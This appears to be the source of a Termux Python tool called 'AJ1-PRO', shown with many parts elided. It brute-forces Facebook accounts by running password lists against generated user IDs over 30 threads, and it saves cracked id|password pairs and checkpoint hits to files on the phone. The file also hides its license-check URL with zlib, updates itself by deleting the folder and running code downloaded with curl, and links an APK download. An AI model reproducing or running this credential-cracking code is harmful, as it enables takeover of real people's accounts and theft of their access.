...
try:
        ...
        os.system('python AJ1.py')
except:pass
myid=uuid.uuid4().hex[:5].upper()
try:
        key1 = open('/data/data/com.termux/files/usr/bin/.mrAJ1xxx-cov', 'r').read()
except:
        kok=open('/data/data/com.termux/files/usr/bin/.mrAJ1xxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrAJ1xxx-cov', 'r').read()
kex=(f"AJ1-XD{uid}TS{key1}PX110E==")
...
def chk():
        ...
        if ua not in urll:
                ...
                if kex in requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).text:
                        print(' Wair for AJ1 New update ');exit()
                else:
...
try:
        ...
        if updt in linx:
                ...
                print('\n AJ1-PRO Update Done Wait for installing...\n')
                os.system('cd $HOME && cd AJ1-PRO')
                os.system('rm -rf *')
                os.system("curl -L https://raw.githubusercontent.com/AJ1110/AJ1-PRO/main/AJ1.py -o AJ1.py && python AJ1.py")
...
Y8888P   `Y88P'  YP   YD Y88888P 88   YD\033[1;37m
----------------------------------------------
 Author    :  AJ1
 Github    : AJ1
        ...
        try:
                ...
                if kex in link:
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AJ1_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi AJ1 Sir, I Need To Buy Your Paid AJ1 PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python AJ1.py')
                        linex()
                        exit()
        except ValueError:
                exit()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as AJ1:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [AJ1-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AJ1=session.cookies.get_dict().keys()
                        if "c_user" in AJ1:
                                print('\r\r\033[1;32m [AJ1-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AJ1-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AJ1:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [AJ1-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AJ1-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [AJ1-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AJ1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AJ1-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [AJ1-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AJ1-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [AJ1-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AJ1-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
